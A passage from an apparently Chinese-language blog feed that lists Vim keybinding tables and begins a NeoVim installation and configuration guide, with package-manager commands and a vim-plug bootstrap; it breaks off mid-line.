<td style="text-align:left">光标向下移动一行</td>
</tr>
<tr>
<td style="text-align:left"><code>k</code> 或 <code>Ctrl + P</code></td>
<td style="text-align:left">光标向上移动一行</td>
</tr>
<tr>
<td style="text-align:left"><code>l</code></td>
<td style="text-align:left">光标向右移动一个字符</td>
</tr>
<tr>
<td style="text-align:left"><code>0</code></td>
<td style="text-align:left">（数字 0）移动光标至本行开头</td>
</tr>
<tr>
<td style="text-align:left"><code>$</code></td>
<td style="text-align:left">移动光标至本行末尾</td>
</tr>
<tr>
<td style="text-align:left"><code>^</code></td>
<td style="text-align:left">移动光标至本行第一个非空字符处</td>
</tr>
<tr>
<td style="text-align:left"><code>w</code></td>
<td style="text-align:left">向前移动一个词 （上一个字母和数字组成的词之后）</td>
</tr>
<tr>
<td style="text-align:left"><code>W</code></td>
<td style="text-align:left">向前移动一个词 （以空格分隔的词）</td>
</tr>
<tr>
<td style="text-align:left"><code>5w</code></td>
<td style="text-align:left">向前移动五个词</td>
</tr>
<tr>
<td style="text-align:left"><code>b</code></td>
<td style="text-align:left">向后移动一个词 （下一个字母和数字组成的词之前）</td>
</tr>
<tr>
<td style="text-align:left"><code>B</code></td>
<td style="text-align:left">向后移动一个词 （以空格分隔的词）</td>
</tr>
<tr>
<td style="text-align:left"><code>5b</code></td>
<td style="text-align:left">向后移动五个词</td>
</tr>
<tr>
<td style="text-align:left"><code>G</code></td>
<td style="text-align:left">移动至文件末尾</td>
</tr>
<tr>
<td style="text-align:left"><code>gg</code></td>
<td style="text-align:left">移动至文件开头</td>
</tr>
</tbody>
</table>
</div>
<h3 id="文档预览"><a href="#文档预览" class="headerlink" title="文档预览"></a>文档预览</h3><div class="table-container">
<table>
<thead>
<tr>
<th style="text-align:left">快捷键</th>
<th style="text-align:left">功能</th>
</tr>
</thead>
<tbody>
<tr>
<td style="text-align:left"><code>(</code></td>
<td style="text-align:left">跳转到上一句</td>
</tr>
<tr>
<td style="text-align:left"><code>)</code></td>
<td style="text-align:left">跳转到下一句</td>
</tr>
<tr>
<td style="text-align:left"><code>&#123;</code></td>
<td style="text-align:left">跳转到上一段</td>
</tr>
<tr>
<td style="text-align:left"><code>&#125;</code></td>
<td style="text-align:left">跳转到下一段</td>
</tr>
<tr>
<td style="text-align:left"><code>[[</code></td>
<td style="text-align:left">跳转到上一部分</td>
</tr>
<tr>
<td style="text-align:left"><code>]]</code></td>
<td style="text-align:left">跳转到下一部分</td>
</tr>
<tr>
<td style="text-align:left"><code>[]</code></td>
<td style="text-align:left">跳转到上一部分的末尾</td>
</tr>
<tr>
<td style="text-align:left"><code>][</code></td>
<td style="text-align:left">跳转到上一部分的开头</td>
</tr>
</tbody>
</table>
</div>
<h3 id="插入"><a href="#插入" class="headerlink" title="插入"></a>插入</h3><div class="table-container">
<table>
<thead>
<tr>
<th style="text-align:left">快捷键</th>
<th style="text-align:left">功能</th>
</tr>
</thead>
<tbody>
<tr>
<td style="text-align:left"><code>a</code></td>
<td style="text-align:left">在光标后插入文本</td>
</tr>
<tr>
<td style="text-align:left"><code>A</code></td>
<td style="text-align:left">在行末插入文本</td>
</tr>
<tr>
<td style="text-align:left"><code>i</code></td>
<td style="text-align:left">在光标前插入文本</td>
</tr>
<tr>
<td style="text-align:left"><code>o</code></td>
<td style="text-align:left">（小写字母 o）在光标下方新开一行</td>
</tr>
<tr>
<td style="text-align:left"><code>O</code></td>
<td style="text-align:left">（大写字母 O）在光标上方新开一行</td>
</tr>
<tr>
<td style="text-align:left"><code>:r [filename]</code></td>
<td style="text-align:left">在光标下方插入文件 [filename] 的内容</td>
</tr>
<tr>
<td style="text-align:left"><code>:r ![command]</code></td>
<td style="text-align:left">执行命令 [command] ，并将输出插入至光标下方</td>
</tr>
</tbody>
</table>
</div>
<h3 id="删除"><a href="#删除" class="headerlink" title="删除"></a>删除</h3><div class="table-container">
<table>
<thead>
<tr>
<th style="text-align:left">快捷键</th>
<th style="text-align:left">功能</th>
</tr>
</thead>
<tbody>
<tr>
<td style="text-align:left"><code>x</code></td>
<td style="text-align:left">删除光标处字符</td>
</tr>
<tr>
<td style="text-align:left"><code>dw</code></td>
<td style="text-align:left">删除一个词</td>
</tr>
<tr>
<td style="text-align:left"><code>d0</code></td>
<td style="text-align:left">删至行首</td>
</tr>
<tr>
<td style="text-align:left"><code>d$</code></td>
<td style="text-align:left">删至行末</td>
</tr>
<tr>
<td style="text-align:left"><code>d)</code></td>
<td style="text-align:left">删至句末</td>
</tr>
<tr>
<td style="text-align:left"><code>dgg</code></td>
<td style="text-align:left">删至文件开头</td>
</tr>
<tr>
<td style="text-align:left"><code>dG</code></td>
<td style="text-align:left">删至文件末尾</td>
</tr>
<tr>
<td style="text-align:left"><code>dd</code></td>
<td style="text-align:left">删除该行</td>
</tr>
<tr>
<td style="text-align:left"><code>3dd</code></td>
<td style="text-align:left">删除三行</td>
</tr>
</tbody>
</table>
</div>
<h3 id="替换"><a href="#替换" class="headerlink" title="替换"></a>替换</h3><div class="table-container">
<table>
<thead>
<tr>
<th style="text-align:left">快捷键</th>
<th style="text-align:left">功能</th>
</tr>
</thead>
<tbody>
<tr>
<td style="text-align:left"><code>r&#123;text&#125;</code></td>
<td style="text-align:left">将光标处的字符替换成 {text}</td>
</tr>
<tr>
<td style="text-align:left"><code>R</code></td>
<td style="text-align:left">进入覆写模式，输入的字符将替换原有的字符</td>
</tr>
</tbody>
</table>
</div>
<h3 id="撤销重做"><a href="#撤销重做" class="headerlink" title="撤销重做"></a>撤销重做</h3><div class="table-container">
<table>
<thead>
<tr>
<th style="text-align:left">快捷键</th>
<th style="text-align:left">功能</th>
</tr>
</thead>
<tbody>
<tr>
<td style="text-align:left"><code>u</code></td>
<td style="text-align:left">撤销最后的操作</td>
</tr>
<tr>
<td style="text-align:left"><code>Ctrl+r</code></td>
<td style="text-align:left">重做最后撤销的操作</td>
</tr>
</tbody>
</table>
</div>
<h3 id="搜索、替换"><a href="#搜索、替换" class="headerlink" title="搜索、替换"></a>搜索、替换</h3><div class="table-container">
<table>
<thead>
<tr>
<th style="text-align:left">快捷键</th>
<th style="text-align:left">功能</th>
</tr>
</thead>
<tbody>
<tr>
<td style="text-align:left"><code>/search_text</code></td>
<td style="text-align:left">检索文档，在文档后面的部分搜索 search_text</td>
</tr>
<tr>
<td style="text-align:left"><code>?search_text</code></td>
<td style="text-align:left">检索文档，在文档前面的部分搜索 search_text</td>
</tr>
<tr>
<td style="text-align:left"><code>n</code></td>
<td style="text-align:left">移动到后一个检索结果</td>
</tr>
<tr>
<td style="text-align:left"><code>N</code></td>
<td style="text-align:left">移动到前一个检索结果</td>
</tr>
<tr>
<td style="text-align:left"><code>:%s/original/replacement</code></td>
<td style="text-align:left">检索第一个 “original” 字符串并将其替换成 “replacement”</td>
</tr>
<tr>
<td style="text-align:left"><code>:%s/original/replacement/g</code></td>
<td style="text-align:left">检索并将所有的 “original” 替换为 “replacement”</td>
</tr>
<tr>
<td style="text-align:left"><code>:%s/original/replacement/gc</code></td>
<td style="text-align:left">检索出所有的 “original” 字符串，但在替换成 “replacement” 前，先询问是否替换</td>
</tr>
</tbody>
</table>
</div>
<h4 id="书签"><a href="#书签" class="headerlink" title="书签"></a>书签</h4><div class="table-container">
<table>
<thead>
<tr>
<th style="text-align:left">快捷键</th>
<th style="text-align:left">功能</th>
</tr>
</thead>
<tbody>
<tr>
<td style="text-align:left"><code>m &#123;a-zA-Z&#125;</code></td>
<td style="text-align:left">在当前光标位置设置书签，书签名可用一个大小写字母（{a-zA-Z}）</td>
</tr>
<tr>
<td style="text-align:left"><code>:marks</code></td>
<td style="text-align:left">列出所有书签</td>
</tr>
<tr>
<td style="text-align:left"><code>&#123;a-zA-Z&#125;</code></td>
<td style="text-align:left">跳转到书签 {a-zA-Z}</td>
</tr>
</tbody>
</table>
</div>
<h3 id="可视模式"><a href="#可视模式" class="headerlink" title="可视模式"></a>可视模式</h3><div class="table-container">
<table>
<thead>
<tr>
<th style="text-align:left">快捷键</th>
<th style="text-align:left">功能</th>
</tr>
</thead>
<tbody>
<tr>
<td style="text-align:left"><code>v</code></td>
<td style="text-align:left">进入逐字可视模式</td>
</tr>
<tr>
<td style="text-align:left"><code>V</code></td>
<td style="text-align:left">进入逐行可视模式</td>
</tr>
<tr>
<td style="text-align:left"><code>Esc</code></td>
<td style="text-align:left">退出可视模式</td>
</tr>
</tbody>
</table>
</div>
<h3 id="修改"><a href="#修改" class="headerlink" title="修改"></a>修改</h3><div class="table-container">
<table>
<thead>
<tr>
<th style="text-align:left">快捷键</th>
<th style="text-align:left">功能</th>
</tr>
</thead>
<tbody>
<tr>
<td style="text-align:left"><code>~</code></td>
<td style="text-align:left">切换大小写</td>
</tr>
<tr>
<td style="text-align:left"><code>d</code></td>
<td style="text-align:left">删除一个词</td>
</tr>
<tr>
<td style="text-align:left"><code>c</code></td>
<td style="text-align:left">变更</td>
</tr>
<tr>
<td style="text-align:left"><code>y</code></td>
<td style="text-align:left">复制</td>
</tr>
<tr>
<td style="text-align:left"><code>&gt;</code></td>
<td style="text-align:left">右移</td>
</tr>
<tr>
<td style="text-align:left"><code>&lt;</code></td>
<td style="text-align:left">左移</td>
</tr>
<tr>
<td style="text-align:left"><code>!</code></td>
<td style="text-align:left">通过外部命令进行过滤</td>
</tr>
</tbody>
</table>
</div>
<h3 id="保存、退出"><a href="#保存、退出" class="headerlink" title="保存、退出"></a>保存、退出</h3><div class="table-container">
<table>
<thead>
<tr>
<th style="text-align:left">快捷键</th>
<th style="text-align:left">功能</th>
</tr>
</thead>
<tbody>
<tr>
<td style="text-align:left"><code>:q</code></td>
<td style="text-align:left">退出 Vim，如果文件已被修改，将退出失败</td>
</tr>
<tr>
<td style="text-align:left"><code>:w</code></td>
<td style="text-align:left">保存文件</td>
</tr>
<tr>
<td style="text-align:left"><code>:w new_name</code></td>
<td style="text-align:left">用 new_name 作为文件名保存文件</td>
</tr>
<tr>
<td style="text-align:left"><code>:wq</code></td>
<td style="text-align:left">保存文件并退出 Vim</td>
</tr>
<tr>
<td style="text-align:left"><code>:q!</code></td>
<td style="text-align:left">退出 Vim，不保存文件改动</td>
</tr>
<tr>
<td style="text-align:left"><code>ZZ</code></td>
<td style="text-align:left">退出 Vim，如果文件被改动过，保存改动内容</td>
</tr>
<tr>
<td style="text-align:left"><code>ZQ</code></td>
<td style="text-align:left">与 :q! 相同，退出 Vim，不保存文件改动</td>
</tr>
</tbody>
</table>
</div>
<h1 id="编辑视图"><a href="#编辑视图" class="headerlink" title="编辑视图"></a>编辑视图</h1><h2 id="插件-1"><a href="#插件-1" class="headerlink" title="插件"></a>插件</h2><div class="table-container">
<table>
<thead>
<tr>
<th style="text-align:left">按键</th>
<th style="text-align:left">映射键</th>
<th style="text-align:left">功能</th>
</tr>
</thead>
<tbody>
<tr>
<td style="text-align:left"><code>Ctrl+d</code></td>
<td style="text-align:left"><code>&lt;Esc&gt;:set cmdheight=2&lt;CR&gt;a</code></td>
<td style="text-align:left">修改命令行行数</td>
</tr>
<tr>
<td style="text-align:left"><code>Ctrl+t</code></td>
<td style="text-align:left"><code>&lt;Esc&gt;:set cmdheight=10&lt;CR&gt;a</code></td>
<td style="text-align:left">修改命令行行数</td>
</tr>
</tbody>
</table>
</div>
<h1 id="可视模式-1"><a href="#可视模式-1" class="headerlink" title="可视模式"></a>可视模式</h1><h2 id="插件-2"><a href="#插件-2" class="headerlink" title="插件"></a>插件</h2><div class="table-container">
<table>
<thead>
<tr>
<th>按键</th>
<th>映射键</th>
<th>功能</th>
</tr>
</thead>
<tbody>
<tr>
<td><code>i&#39;</code>, <code>i&quot;</code>, <code>i)</code>, <code>i]</code>, <code>i&#125;</code></td>
<td></td>
<td>选中’, “, ), ]内的内容 (符号正反都可)</td>
</tr>
<tr>
<td><code>ip</code></td>
<td></td>
<td>选中段落</td>
</tr>
<tr>
<td><code>it</code></td>
<td></td>
<td>选中html标签内的内容</td>
</tr>
</tbody>
</table>
</div>
<h1 id="vim默认快捷键-1"><a href="#vim默认快捷键-1" class="headerlink" title="vim默认快捷键"></a>vim默认快捷键</h1><h2 id="控制光标-1"><a href="#控制光标-1" class="headerlink" title="控制光标"></a>控制光标</h2><div class="table-container">
<table>
<thead>
<tr>
<th style="text-align:left">快捷键</th>
<th style="text-align:left">功能</th>
</tr>
</thead>
<tbody>
<tr>
<td style="text-align:left"><code>h</code></td>
<td style="text-align:left">光标向左移动一个字符</td>
</tr>
<tr>
<td style="text-align:left"><code>j</code> 或 <code>Ctrl + J</code></td>
<td style="text-align:left">光标向下移动一行</td>
</tr>
<tr>
<td style="text-align:left"><code>k</code> 或 <code>Ctrl + P</code></td>
<td style="text-align:left">光标向上移动一行</td>
</tr>
<tr>
<td style="text-align:left"><code>l</code></td>
<td style="text-align:left">光标向右移动一个字符</td>
</tr>
<tr>
<td style="text-align:left"><code>0</code></td>
<td style="text-align:left">（数字 0）移动光标至本行开头</td>
</tr>
<tr>
<td style="text-align:left"><code>$</code></td>
<td style="text-align:left">移动光标至本行末尾</td>
</tr>
<tr>
<td style="text-align:left"><code>^</code></td>
<td style="text-align:left">移动光标至本行第一个非空字符处</td>
</tr>
<tr>
<td style="text-align:left"><code>w</code></td>
<td style="text-align:left">向前移动一个词 （上一个字母和数字组成的词之后）</td>
</tr>
<tr>
<td style="text-align:left"><code>W</code></td>
<td style="text-align:left">向前移动一个词 （以空格分隔的词）</td>
</tr>
<tr>
<td style="text-align:left"><code>5w</code></td>
<td style="text-align:left">向前移动五个词</td>
</tr>
<tr>
<td style="text-align:left"><code>b</code></td>
<td style="text-align:left">向后移动一个词 （下一个字母和数字组成的词之前）</td>
</tr>
<tr>
<td style="text-align:left"><code>B</code></td>
<td style="text-align:left">向后移动一个词 （以空格分隔的词）</td>
</tr>
<tr>
<td style="text-align:left"><code>5b</code></td>
<td style="text-align:left">向后移动五个词</td>
</tr>
<tr>
<td style="text-align:left"><code>G</code></td>
<td style="text-align:left">移动至文件末尾</td>
</tr>
<tr>
<td style="text-align:left"><code>gg</code></td>
<td style="text-align:left">移动至文件开头</td>
</tr>
</tbody>
</table>
</div>
<h2 id="文档预览-1"><a href="#文档预览-1" class="headerlink" title="文档预览"></a>文档预览</h2><div class="table-container">
<table>
<thead>
<tr>
<th style="text-align:left">快捷键</th>
<th style="text-align:left">功能</th>
</tr>
</thead>
<tbody>
<tr>
<td style="text-align:left"><code>(</code></td>
<td style="text-align:left">跳转到上一句</td>
</tr>
<tr>
<td style="text-align:left"><code>)</code></td>
<td style="text-align:left">跳转到下一句</td>
</tr>
<tr>
<td style="text-align:left"><code>&#123;</code></td>
<td style="text-align:left">跳转到上一段</td>
</tr>
<tr>
<td style="text-align:left"><code>&#125;</code></td>
<td style="text-align:left">跳转到下一段</td>
</tr>
<tr>
<td style="text-align:left"><code>[[</code></td>
<td style="text-align:left">跳转到上一部分</td>
</tr>
<tr>
<td style="text-align:left"><code>]]</code></td>
<td style="text-align:left">跳转到下一部分</td>
</tr>
<tr>
<td style="text-align:left"><code>[]</code></td>
<td style="text-align:left">跳转到上一部分的末尾</td>
</tr>
<tr>
<td style="text-align:left"><code>][</code></td>
<td style="text-align:left">跳转到上一部分的开头</td>
</tr>
</tbody>
</table>
</div>
<h2 id="插入-1"><a href="#插入-1" class="headerlink" title="插入"></a>插入</h2><div class="table-container">
<table>
<thead>
<tr>
<th style="text-align:left">快捷键</th>
<th style="text-align:left">功能</th>
</tr>
</thead>
<tbody>
<tr>
<td style="text-align:left"><code>a</code></td>
<td style="text-align:left">在光标后插入文本</td>
</tr>
<tr>
<td style="text-align:left"><code>A</code></td>
<td style="text-align:left">在行末插入文本</td>
</tr>
<tr>
<td style="text-align:left"><code>i</code></td>
<td style="text-align:left">在光标前插入文本</td>
</tr>
<tr>
<td style="text-align:left"><code>o</code></td>
<td style="text-align:left">（小写字母 o）在光标下方新开一行</td>
</tr>
<tr>
<td style="text-align:left"><code>O</code></td>
<td style="text-align:left">（大写字母 O）在光标上方新开一行</td>
</tr>
<tr>
<td style="text-align:left"><code>:r [filename]</code></td>
<td style="text-align:left">在光标下方插入文件 [filename] 的内容</td>
</tr>
<tr>
<td style="text-align:left"><code>:r ![command]</code></td>
<td style="text-align:left">执行命令 [command] ，并将输出插入至光标下方</td>
</tr>
</tbody>
</table>
</div>
<h2 id="删除-1"><a href="#删除-1" class="headerlink" title="删除"></a>删除</h2><div class="table-container">
<table>
<thead>
<tr>
<th style="text-align:left">快捷键</th>
<th style="text-align:left">功能</th>
</tr>
</thead>
<tbody>
<tr>
<td style="text-align:left"><code>x</code></td>
<td style="text-align:left">删除光标处字符</td>
</tr>
<tr>
<td style="text-align:left"><code>dw</code></td>
<td style="text-align:left">删除一个词</td>
</tr>
<tr>
<td style="text-align:left"><code>d0</code></td>
<td style="text-align:left">删至行首</td>
</tr>
<tr>
<td style="text-align:left"><code>d$</code></td>
<td style="text-align:left">删至行末</td>
</tr>
<tr>
<td style="text-align:left"><code>d)</code></td>
<td style="text-align:left">删至句末</td>
</tr>
<tr>
<td style="text-align:left"><code>dgg</code></td>
<td style="text-align:left">删至文件开头</td>
</tr>
<tr>
<td style="text-align:left"><code>dG</code></td>
<td style="text-align:left">删至文件末尾</td>
</tr>
<tr>
<td style="text-align:left"><code>dd</code></td>
<td style="text-align:left">删除该行</td>
</tr>
<tr>
<td style="text-align:left"><code>3dd</code></td>
<td style="text-align:left">删除三行</td>
</tr>
</tbody>
</table>
</div>
<h2 id="替换-1"><a href="#替换-1" class="headerlink" title="替换"></a>替换</h2><div class="table-container">
<table>
<thead>
<tr>
<th style="text-align:left">快捷键</th>
<th style="text-align:left">功能</th>
</tr>
</thead>
<tbody>
<tr>
<td style="text-align:left"><code>r&#123;text&#125;</code></td>
<td style="text-align:left">将光标处的字符替换成 {text}</td>
</tr>
<tr>
<td style="text-align:left"><code>R</code></td>
<td style="text-align:left">进入覆写模式，输入的字符将替换原有的字符</td>
</tr>
</tbody>
</table>
</div>
<h2 id="撤销重做-1"><a href="#撤销重做-1" class="headerlink" title="撤销重做"></a>撤销重做</h2><div class="table-container">
<table>
<thead>
<tr>
<th style="text-align:left">快捷键</th>
<th style="text-align:left">功能</th>
</tr>
</thead>
<tbody>
<tr>
<td style="text-align:left"><code>u</code></td>
<td style="text-align:left">撤销最后的操作</td>
</tr>
<tr>
<td style="text-align:left"><code>Ctrl+r</code></td>
<td style="text-align:left">重做最后撤销的操作</td>
</tr>
</tbody>
</table>
</div>
<h2 id="搜索、替换-1"><a href="#搜索、替换-1" class="headerlink" title="搜索、替换"></a>搜索、替换</h2><div class="table-container">
<table>
<thead>
<tr>
<th style="text-align:left">快捷键</th>
<th style="text-align:left">功能</th>
</tr>
</thead>
<tbody>
<tr>
<td style="text-align:left"><code>/search_text</code></td>
<td style="text-align:left">检索文档，在文档后面的部分搜索 search_text</td>
</tr>
<tr>
<td style="text-align:left"><code>?search_text</code></td>
<td style="text-align:left">检索文档，在文档前面的部分搜索 search_text</td>
</tr>
<tr>
<td style="text-align:left"><code>n</code></td>
<td style="text-align:left">移动到后一个检索结果</td>
</tr>
<tr>
<td style="text-align:left"><code>N</code></td>
<td style="text-align:left">移动到前一个检索结果</td>
</tr>
<tr>
<td style="text-align:left"><code>:%s/original/replacement</code></td>
<td style="text-align:left">检索第一个 “original” 字符串并将其替换成 “replacement”</td>
</tr>
<tr>
<td style="text-align:left"><code>:%s/original/replacement/g</code></td>
<td style="text-align:left">检索并将所有的 “original” 替换为 “replacement”</td>
</tr>
<tr>
<td style="text-align:left"><code>:%s/original/replacement/gc</code></td>
<td style="text-align:left">检索出所有的 “original” 字符串，但在替换成 “replacement” 前，先询问是否替换</td>
</tr>
</tbody>
</table>
</div>
<h3 id="书签-1"><a href="#书签-1" class="headerlink" title="书签"></a>书签</h3><div class="table-container">
<table>
<thead>
<tr>
<th style="text-align:left">快捷键</th>
<th style="text-align:left">功能</th>
</tr>
</thead>
<tbody>
<tr>
<td style="text-align:left"><code>m &#123;a-zA-Z&#125;</code></td>
<td style="text-align:left">在当前光标位置设置书签，书签名可用一个大小写字母（{a-zA-Z}）</td>
</tr>
<tr>
<td style="text-align:left"><code>:marks</code></td>
<td style="text-align:left">列出所有书签</td>
</tr>
<tr>
<td style="text-align:left"><code>&#123;a-zA-Z&#125;</code></td>
<td style="text-align:left">跳转到书签 {a-zA-Z}</td>
</tr>
</tbody>
</table>
</div>
<h2 id="可视模式-2"><a href="#可视模式-2" class="headerlink" title="可视模式"></a>可视模式</h2><div class="table-container">
<table>
<thead>
<tr>
<th style="text-align:left">快捷键</th>
<th style="text-align:left">功能</th>
</tr>
</thead>
<tbody>
<tr>
<td style="text-align:left"><code>v</code></td>
<td style="text-align:left">进入逐字可视模式</td>
</tr>
<tr>
<td style="text-align:left"><code>V</code></td>
<td style="text-align:left">进入逐行可视模式</td>
</tr>
<tr>
<td style="text-align:left"><code>Esc</code></td>
<td style="text-align:left">退出可视模式</td>
</tr>
</tbody>
</table>
</div>
<h2 id="修改-1"><a href="#修改-1" class="headerlink" title="修改"></a>修改</h2><div class="table-container">
<table>
<thead>
<tr>
<th style="text-align:left">快捷键</th>
<th style="text-align:left">功能</th>
</tr>
</thead>
<tbody>
<tr>
<td style="text-align:left"><code>~</code></td>
<td style="text-align:left">切换大小写</td>
</tr>
<tr>
<td style="text-align:left"><code>d</code></td>
<td style="text-align:left">删除一个词</td>
</tr>
<tr>
<td style="text-align:left"><code>c</code></td>
<td style="text-align:left">变更</td>
</tr>
<tr>
<td style="text-align:left"><code>y</code></td>
<td style="text-align:left">复制</td>
</tr>
<tr>
<td style="text-align:left"><code>&gt;</code></td>
<td style="text-align:left">右移</td>
</tr>
<tr>
<td style="text-align:left"><code>&lt;</code></td>
<td style="text-align:left">左移</td>
</tr>
<tr>
<td style="text-align:left"><code>!</code></td>
<td style="text-align:left">通过外部命令进行过滤</td>
</tr>
</tbody>
</table>
</div>
<h2 id="保存、退出-1"><a href="#保存、退出-1" class="headerlink" title="保存、退出"></a>保存、退出</h2><div class="table-container">
<table>
<thead>
<tr>
<th style="text-align:left">快捷键</th>
<th style="text-align:left">功能</th>
</tr>
</thead>
<tbody>
<tr>
<td style="text-align:left"><code>:q</code></td>
<td style="text-align:left">退出 Vim，如果文件已被修改，将退出失败</td>
</tr>
<tr>
<td style="text-align:left"><code>:w</code></td>
<td style="text-align:left">保存文件</td>
</tr>
<tr>
<td style="text-align:left"><code>:w new_name</code></td>
<td style="text-align:left">用 new_name 作为文件名保存文件</td>
</tr>
<tr>
<td style="text-align:left"><code>:wq</code></td>
<td style="text-align:left">保存文件并退出 Vim</td>
</tr>
<tr>
<td style="text-align:left"><code>:q!</code></td>
<td style="text-align:left">退出 Vim，不保存文件改动</td>
</tr>
<tr>
<td style="text-align:left"><code>ZZ</code></td>
<td style="text-align:left">退出 Vim，如果文件被改动过，保存改动内容</td>
</tr>
<tr>
<td style="text-align:left"><code>ZQ</code></td>
<td style="text-align:left">与 :q! 相同，退出 Vim，不保存文件改动</td>
</tr>
</tbody>
</table>
</div>
]]></content>
      <tags>
        <tag>vim</tag>
        <tag>NeoVim</tag>
      </tags>
  </entry>
  <entry>
    <title>NeoVim飞升过程</title>
    <url>/2020/03/15/NeoVim%E9%A3%9E%E5%8D%87%E8%BF%87%E7%A8%8B/</url>
    <content><![CDATA[<h1 id="安装"><a href="#安装" class="headerlink" title="安装"></a>安装</h1><h2 id="Windows"><a href="#Windows" class="headerlink" title="Windows"></a>Windows</h2><ul>
<li><p>Scoop : <code>scoop install neovim</code></p>
</li>
<li><p>Chocolatey : <code>choco install neovim</code></p>
</li>
</ul>
<h2 id="macOS-OS-X"><a href="#macOS-OS-X" class="headerlink" title="macOS / OS X"></a>macOS / OS X</h2><ul>
<li><p>brew : <code>brew install neovim</code></p>
</li>
<li><p>Macports : <code>sudo port selfupdate &amp;&amp; sudo port install neovim</code></p>
</li>
</ul>
<a id="more"></a>
<h2 id="Linux"><a href="#Linux" class="headerlink" title="Linux"></a>Linux</h2><h3 id="Linux-AppImage通用包"><a href="#Linux-AppImage通用包" class="headerlink" title="Linux AppImage通用包"></a>Linux AppImage通用包</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">curl -LO https://github.com/neovim/neovim/releases/download/stable/nvim.appimage</span><br><span class="line">chmod u+x nvim.appimage</span><br><span class="line">./nvim.appimage</span><br></pre></td></tr></table></figure>
<h3 id="常见Linux发行版"><a href="#常见Linux发行版" class="headerlink" title="常见Linux发行版"></a>常见Linux发行版</h3><ul>
<li><p><strong>Arch Linux</strong> : <code>sudo pacman -S neovim</code></p>
<p>python模块 : <code>sudo pacman -S python-pynvim</code>  ,Python2 和 Ruby 模块 <code>python2-neovim</code> 、<code>ruby-neovim</code></p>
</li>
<li><p><strong>CentOS / RHEL</strong> : </p>
<p>Neovim可通过EPEL（企业Linux的额外软件包）获得</p>
</li>
</ul>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">yum install -y https://dl.fedoraproject.org/pub/epel/epel-release-latest-7.noarch.rpm</span><br><span class="line"><span class="comment"># python模块</span></span><br><span class="line">yum install -y neovim python3-neovim</span><br><span class="line"><span class="comment"># 在较旧的版本上，可能需要python2-neovim</span></span><br></pre></td></tr></table></figure>
<ul>
<li><p><strong>Debian</strong> : <code>sudo apt-get install neovim</code></p>
<p>python模块 : <code>sudo apt-get install python-neovim</code> 、<code>sudo apt-get install python3-neovim</code></p>
</li>
<li><p><strong>Fedora</strong> : <code>sudo dnf install -y neovim python3-neovim</code></p>
</li>
<li><p><strong>Ubuntu</strong> : <code>sudo apt install neovim</code></p>
<p>python模块 : <code>sudo apt install python-neovim</code> 、<code>sudo apt install python3-neovim</code></p>
<p>旧版Ubuntu使用:</p>
</li>
</ul>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sudo apt-get install python-software-properties</span><br><span class="line">sudo add-apt-repository ppa:neovim-ppa/stable</span><br><span class="line">sudo apt-get update</span><br><span class="line">sudo apt-get install neovim</span><br><span class="line"></span><br><span class="line"><span class="comment"># python模块</span></span><br><span class="line">sudo apt-get install python-dev python-pip python3-dev python3-pip</span><br><span class="line">sudo apt-get install python-dev python-pip python3-dev</span><br><span class="line">sudo apt-get install python3-setuptools</span><br><span class="line">sudo easy_install3 pip</span><br></pre></td></tr></table></figure>
<h2 id="BSD-Unix"><a href="#BSD-Unix" class="headerlink" title="BSD (Unix)"></a>BSD (Unix)</h2><ul>
<li><p><strong>FreeBSD</strong> : <code>pkg install neovim</code></p>
<p>python模块 : <code>pkg install py27-pynvim py36-pynvim</code></p>
</li>
<li><p><strong>OpenBSD</strong> : <code>pkg_add neovim</code></p>
</li>
</ul>
<p><a href="https://github.com/neovim/neovim/wiki/Installing-Neovim">更多产考官方wiki</a></p>
<h1 id="美化飞升"><a href="#美化飞升" class="headerlink" title="美化飞升"></a>美化飞升</h1><p>若已经有vim的配置，可使用<code>ln -s .vim/vimrc .config/nvim/init.vim</code>与vim共用配置，可能有不兼容情况，尽量新建<code>nvim ~/.config/nvim/init.vim</code></p>
<p>状态栏美化插件,需要安装powerline-fonts字体（<a href="https://github.com/powerline/fonts）">https://github.com/powerline/fonts）</a> #sudo pacman -S powerline-fonts</p>
<figure class="highlight vim"><table><tr><td class="code"><pre><span class="line"><span class="comment">&quot;                               _ ____    _   ___     ___           ____   ____</span></span><br><span class="line"><span class="comment">&quot;   ___  ___  _ __  _   _ _ __ ( ) ___|  | \ | \ \   / (_)_ __ ___ |  _ \ / ___|</span></span><br><span class="line"><span class="comment">&quot;  / _ \/ _ \| &#x27;_ \| | | | &#x27;_ \|/\___ \  |  \| |\ \ / /| | &#x27;_ ` _ \| |_) | |</span></span><br><span class="line"><span class="comment">&quot; |  __/ (_) | | | | |_| | | | |  ___) | | |\  | \ V / | | | | | | |  _ &lt;| |___</span></span><br><span class="line"><span class="comment">&quot;  \___|\___/|_| |_|\__,_|_| |_| |____/  |_| \_|  \_/  |_|_| |_| |_|_| \_\\____|</span></span><br><span class="line"><span class="comment">&quot;</span></span><br><span class="line"><span class="comment">&quot;  =================================木He寸&amp;eonun================================</span></span><br><span class="line"><span class="comment">&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">&quot; i 写入模式、i插入之前、I行首插入、a插入之后、A行尾插入、o下行插入、O上行插入、x 删除光标后一个字符</span></span><br><span class="line"><span class="comment">&quot; &lt;Operation(操作)&gt; &lt;Motion(动作)&gt;</span></span><br><span class="line"><span class="comment">&quot; d 剪切操作(剪切可看做删除), y 复制操作, p 粘贴操作， c 剪切后修改操作</span></span><br><span class="line"><span class="comment">&quot; ← 左动作， → 右动作， 3← 3个左动作， b 选择光标开启到上一个词后的内容， i 指明光标在词中，当前词待操作， w 选择光标开始到下个词前的内容， iw 在当前词之间选择该， y3← 向右复制， f 查找动作</span></span><br><span class="line"></span><br><span class="line"><span class="comment">&quot; ===</span></span><br><span class="line"><span class="comment">&quot; &gt;&gt;&gt;首次使用自动配置</span></span><br><span class="line"><span class="comment">&quot; ===</span></span><br><span class="line"></span><br><span class="line"><span class="comment">&quot; ==安装plug</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> <span class="built_in">empty</span>(<span class="built_in">glob</span>(<span class="string">&#x27;~/.config/nvim/autoload/plug.vim&#x27;</span>))</span><br><span class="line">	<span class="keyword">silent</span> !curl -fLo ~/.config/nvim/autoload/plug.<span class="keyword">vim</span> --create-dirs</span><br><span class="line">		\ http<span class="variable">s:</span>//raw.githubusercontent.<span class="keyword">com</span>/junegunn/<span class="keyword">vim</span>-plug/master/plug.<span class="keyword">vim</span></span><br><span class="line">	<span class="keyword">autocmd</span> VimEnter * PlugInstall --<span 